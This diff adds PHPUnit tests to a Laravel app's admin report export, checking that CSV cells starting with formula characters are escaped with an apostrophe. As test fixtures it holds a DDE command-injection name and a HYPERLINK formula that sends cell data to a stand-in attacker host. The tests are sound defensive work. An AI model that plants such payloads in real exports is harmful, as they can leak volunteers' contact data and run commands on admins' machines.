@@ -7,6 +7,7 @@ use App\Models\Report;
 use App\Models\Shift;
 use App\Models\User;
 use Illuminate\Foundation\Testing\RefreshDatabase;
+use PHPUnit\Framework\Attributes\DataProvider;
 use Tests\TestCase;
 use Tests\Traits\AssertsExportResponses;
 use Tests\Traits\MakesTags;
@@ -87,6 +88,111 @@ class ExportReportsTest extends TestCase
         $this->assertSame('0', $rows[1][6]);
         $this->assertSame('Main Cart', $rows[1][11]);
         $this->assertSame('Bob Associate', $rows[1][16]);
+    }
+
+    public function test_a_comment_that_looks_like_a_formula_is_exported_as_text(): void
+    {
+        $admin = User::factory()->enabled()->adminRoleUser()->create();
+        $user = User::factory()->enabled()->create(['name' => '=cmd|\'/C calc\'!A0']);
+        $location = Location::factory()->create();
+        $shift = Shift::factory()->everyDay9am()->for($location)->create();
+
+        // A volunteer writes this into their own shift report. It reaches an
+        // admin's spreadsheet, alongside the roster's phone numbers and emails.
+        $payload = '=HYPERLINK("https://attacker.example/?d="&A2,"Click")';
+
+        Report::factory()->create([
+            'shift_id' => $shift->id,
+            'report_submitted_user_id' => $user->id,
+            'shift_date' => '2024-01-10',
+            'comments' => $payload,
+            'metadata' => [
+                'shift_id' => $shift->id,
+                'shift_time' => '09:00:00',
+                'location_id' => $location->id,
+                'location_name' => $location->name,
+                'submitted_by_id' => $user->id,
+                'submitted_by_name' => $user->name,
+                'submitted_by_email' => $user->email,
+                'submitted_by_phone' => $user->mobile_phone,
+                'associates' => [],
+            ],
+        ]);
+
+        $rows = $this->assertExportCsvDownload(
+            $this->actingAs($admin)
+                ->get('/admin/exports/reports?start_date=2024-01-01&end_date=2024-01-31'),
+            'reports',
+        );
+
+        // The apostrophe is what stops the spreadsheet evaluating the cell. The
+        // text itself is kept intact so the admin still reads what was written.
+        $this->assertSame("'".$payload, $rows[1][5]);
+        $this->assertStringStartsWith("'=cmd", $rows[1][13]);
+    }
+
+    /**
+     * @return list<string>
+     */
+    public static function formulaLeadingCharacterProvider(): array
+    {
+        return [
+            'equals' => ['='],
+            'plus' => ['+'],
+            'minus' => ['-'],
+            'at' => ['@'],
+            'tab' => ["\t"],
+            'carriage return' => ["\r"],
+        ];
+    }
+
+    #[DataProvider('formulaLeadingCharacterProvider')]
+    public function test_every_formula_leading_character_is_neutralised(string $character): void
+    {
+        $admin = User::factory()->enabled()->adminRoleUser()->create();
+        $user = User::factory()->enabled()->create();
+        $shift = Shift::factory()->everyDay9am()->for(Location::factory())->create();
+
+        Report::factory()->create([
+            'shift_id' => $shift->id,
+            'report_submitted_user_id' => $user->id,
+            'shift_date' => '2024-01-10',
+            'comments' => $character.'SUM(1+1)',
+            'metadata' => null,
+        ]);
+
+        $rows = $this->assertExportCsvDownload(
+            $this->actingAs($admin)
+                ->get('/admin/exports/reports?start_date=2024-01-01&end_date=2024-01-31'),
+            'reports',
+        );
+
+        $this->assertSame("'".$character.'SUM(1+1)', $rows[1][5]);
+    }
+
+    public function test_an_ordinary_comment_is_left_alone(): void
+    {
+        $admin = User::factory()->enabled()->adminRoleUser()->create();
+        $user = User::factory()->enabled()->create();
+        $shift = Shift::factory()->everyDay9am()->for(Location::factory())->create();
+
+        Report::factory()->create([
+            'shift_id' => $shift->id,
+            'report_submitted_user_id' => $user->id,
+            'shift_date' => '2024-01-10',
+            'comments' => 'Busy morning, 3 placements',
+            'metadata' => null,
+        ]);
+
+        $rows = $this->assertExportCsvDownload(
+            $this->actingAs($admin)
+                ->get('/admin/exports/reports?start_date=2024-01-01&end_date=2024-01-31'),
+            'reports',
+        );
+
+        // Escaping everything would put a stray apostrophe in front of every
+        // cell an admin reads, so only the dangerous opening characters count.
+        $this->assertSame('Busy morning, 3 placements', $rows[1][5]);
     }
 
     public function test_reports_are_limited_to_date_range(): void
